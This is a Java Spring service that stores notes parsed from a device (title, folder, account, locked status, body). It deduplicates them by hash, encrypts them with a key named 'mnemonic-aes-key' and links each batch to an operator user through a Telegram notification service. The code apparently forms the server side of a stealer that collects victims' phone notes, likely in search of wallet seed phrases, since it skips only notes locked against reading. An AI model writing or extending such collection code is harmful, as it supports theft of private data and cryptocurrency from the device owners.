package com.consumer.service;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Service;

import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.consumer.config.V26ConsumerProperties;
import com.consumer.dao.MemorandumDao;
import com.consumer.parse.ParsedNote;
import com.consumer.entity.MemorandumEntity;
import com.consumer.util.MnemonicAesUtil;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@Service
@RequiredArgsConstructor
public class MemorandumStoreService {

    private final MemorandumDao memorandumDao;
    private final V26ConsumerProperties props;
    private final TgNotifyService tgNotifyService;

    public int persist(String deviceId, String appId, List<ParsedNote> notes) {
        String secret = StringUtils.trimToEmpty(props.getMnemonicAesKey());
        if (!MnemonicAesUtil.hasSecret(secret)) {
            log.warn("memorandum persist: mnemonic-aes-key 未配置，明文入库");
        }
        String did = StringUtils.trimToEmpty(deviceId).toLowerCase(Locale.ROOT);
        if (did.isEmpty() || notes == null || notes.isEmpty()) {
            return 0;
        }
        String aid = StringUtils.trimToEmpty(appId);
        Integer userid = tgNotifyService.resolveUserId(aid);
        Set<String> existing = existingHashes(did, secret);
        int added = 0;
        for (ParsedNote note : notes) {
            String body = StringUtils.trimToEmpty(note.getBody());
            if (note.isLocked() && (body.isEmpty() || "（已加锁，无法读取正文）".equals(body))) {
                continue;
            }
            String text = formatNote(note);
            String h = noteHash(text);
            if (h.isEmpty() || existing.contains(h)) {
                continue;
            }
            try {
                MemorandumEntity row = new MemorandumEntity();
                row.setDeviceId(did);
                row.setAppId(aid);
                row.setUserid(userid);
                row.setResult(MnemonicAesUtil.encrypt(text, secret));
                row.setResultHash(h);
                row.setAddtime(new Date());
                memorandumDao.insert(row);
                existing.add(h);
                added++;
            } catch (Exception e) {
                log.warn("memorandum encrypt fail device={}: {}", did, e.toString());
            }
        }
        if (added > 0) {
            log.info("memorandum persisted device={} appId={} userid={} count={}", did, aid, userid, added);
        }
        return added;
    }

    private Set<String> existingHashes(String did, String secret) {
        Set<String> hashes = new HashSet<>();
        List<MemorandumEntity> rows = memorandumDao.selectList(new QueryWrapper<MemorandumEntity>().eq("deviceId", did));
        for (MemorandumEntity row : rows) {
            String h = StringUtils.trimToEmpty(row.getResultHash());
            if (!h.isEmpty()) {
                hashes.add(h);
                continue;
            }
            try {
                String plain = MnemonicAesUtil.decrypt(row.getResult(), secret);
                h = noteHash(plain);
                if (!h.isEmpty()) {
                    row.setResultHash(h);
                    memorandumDao.updateById(row);
                    hashes.add(h);
                }
            } catch (Exception ignored) {
            }
        }
        return hashes;
    }

    public static String formatNote(ParsedNote note) {
        String title = StringUtils.defaultIfBlank(note.getTitle(), "（无标题）");
        String body = StringUtils.trimToEmpty(note.getBody());
        StringBuilder sb = new StringBuilder();
        sb.append("标题：").append(title);
        if (StringUtils.isNotBlank(note.getFolder())) {
            sb.append("\n文件夹：").append(note.getFolder());
        }
        if (StringUtils.isNotBlank(note.getAccount())) {
            sb.append("\n账号：").append(note.getAccount());
        }
        if (note.isLocked()) {
            sb.append("\n状态：已加锁");
        }
        sb.append("\n正文：\n").append(body.isEmpty() ? "（无正文）" : body);
        return sb.toString();
    }

    private static String noteHash(String text) {
        String norm = StringUtils.trimToEmpty(text).replace("\r\n", "\n");
        if (norm.isEmpty()) {
            return "";
        }
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] d = md.digest(norm.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder(d.length * 2);
            for (byte b : d) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }
}
